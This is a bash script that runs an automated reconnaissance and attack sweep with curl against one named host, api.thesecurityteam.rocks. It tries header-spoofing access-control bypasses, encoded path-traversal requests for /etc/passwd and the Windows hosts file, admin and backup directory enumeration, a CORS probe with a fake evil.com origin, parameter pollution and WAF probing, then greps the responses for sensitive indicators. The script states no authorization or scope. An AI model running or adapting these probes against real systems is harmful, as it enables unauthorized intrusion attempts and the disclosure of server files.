#!/bin/bash
echo "======================================"
echo "EXHAUSTIVE ANALYSIS - api.thesecurityteam.rocks"
echo "======================================"
echo

TARGET="api.thesecurityteam.rocks"
PROTOCOL="https"
FULL_URL="https://api.thesecurityteam.rocks"

echo "[INFO] Starting comprehensive reconnaissance..."
echo "[TARGET] $FULL_URL"
echo "[TIME] $(date)"
echo

# Test 1: Basic connectivity and methods
echo "[TEST 1] Testing basic connectivity and HTTP methods..."
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" --connect-timeout 10 --max-time 30 > basic_test.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/" -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 >> basic_test.txt
curl -s -k -X PUT "$PROTOCOL://$TARGET/" -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 >> basic_test.txt
curl -s -k -X DELETE "$PROTOCOL://$TARGET/" -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 >> basic_test.txt
curl -s -k -X PATCH "$PROTOCOL://$TARGET/" -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 >> basic_test.txt
echo "[RESULT] Check basic_test.txt for HTTP methods and responses"
echo

# Test 2: Header manipulation bypasses
echo "[TEST 2] Testing header manipulation bypasses..."
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 192.168.1.1" -H "X-Originating-IP: 10.0.0.1" --connect-timeout 10 --max-time 30 > header_bypass.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "Host: bypass.com" -H "X-Forwarded-Host: evil.com" --connect-timeout 10 --max-time 30 >> header_bypass.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "X-Original-URL: /admin" -H "X-Rewrite-URL: /secret" --connect-timeout 10 --max-time 30 >> header_bypass.txt
echo "[RESULT] Check header_bypass.txt for header manipulation results"
echo

# Test 3: Path traversal attempts
echo "[TEST 3] Testing path traversal..."
curl -s -k -X GET "$PROTOCOL://$TARGET/../../../etc/passwd" --connect-timeout 10 --max-time 30 > path_traversal.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/..%2f..%2f..%2fetc%2fpasswd" --connect-timeout 10 --max-time 30 >> path_traversal.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/%2e%2e/%2e%2e/%2e%2e/etc/passwd" --connect-timeout 10 --max-time 30 >> path_traversal.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" --connect-timeout 10 --max-time 30 >> path_traversal.txt
echo "[RESULT] Check path_traversal.txt for path traversal results"
echo

# Test 4: Directory enumeration
echo "[TEST 4] Testing common directories..."
for dir in admin api config backup test debug login register; do
    curl -s -k -X GET "$PROTOCOL://$TARGET/$dir/" --connect-timeout 5 --max-time 15 >> directory_enum.txt
    echo "=== Testing /$dir/ ===" >> directory_enum.txt
done
echo "[RESULT] Check directory_enum.txt for directory enumeration results"
echo

# Test 5: Security headers analysis
echo "[TEST 5] Analyzing security headers..."
curl -s -k -I "$PROTOCOL://$TARGET/" --connect-timeout 10 --max-time 30 > security_headers.txt
echo "[RESULT] Check security_headers.txt for security header analysis"
echo

# Test 6: Technology stack fingerprinting
echo "[TEST 6] Fingerprinting technology stack..."
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "Server: Test" -H "X-Powered-By: Test" --connect-timeout 10 --max-time 30 > tech_fingerprint.txt
echo "[RESULT] Check tech_fingerprint.txt for technology identification"
echo

# Test 7: Error-based information disclosure
echo "[TEST 7] Testing error-based information disclosure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/nonexistent" --connect-timeout 10 --max-time 30 > error_disclosure.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/" -d "invalid=data" --connect-timeout 10 --max-time 30 >> error_disclosure.txt
echo "[RESULT] Check error_disclosure.txt for error message analysis"
echo

# Test 8: Parameter pollution
echo "[TEST 8] Testing HTTP Parameter Pollution..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?param=value1&param=value2" --connect-timeout 10 --max-time 30 > param_pollution.txt
echo "[RESULT] Check param_pollution.txt for parameter pollution results"
echo

# Test 9: CORS testing
echo "[TEST 9] Testing CORS configuration..."
curl -s -k -X OPTIONS "$PROTOCOL://$TARGET/" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" --connect-timeout 10 --max-time 30 > cors_test.txt
echo "[RESULT] Check cors_test.txt for CORS configuration"
echo

# Test 10: Rate limiting and WAF detection
echo "[TEST 10] Testing rate limiting and WAF..."
for i in {1..10}; do
    curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "User-Agent: RateTest-$i" --connect-timeout 5 --max-time 10 >> rate_limit_test.txt
    echo "Request $i completed"
done
echo "[RESULT] Check rate_limit_test.txt for rate limiting and WAF detection"
echo

echo "[COMPLETED] Comprehensive analysis completed. Review all *.txt files for findings."
echo "[TIME] $(date)"
echo

# Quick analysis
echo "[ANALYSIS] Searching for interesting indicators..."
grep -i "error\|exception\|stack\|debug\|admin\|api\|config" *.txt > interesting_indicators.txt 2>/dev/null
if [ -s interesting_indicators.txt ]; then
    echo "[WARNING] Interesting indicators found! Check interesting_indicators.txt"
else
    echo "[INFO] No obvious interesting indicators in initial scan"
fi
echo

echo "Exhaustive analysis phase completed successfully."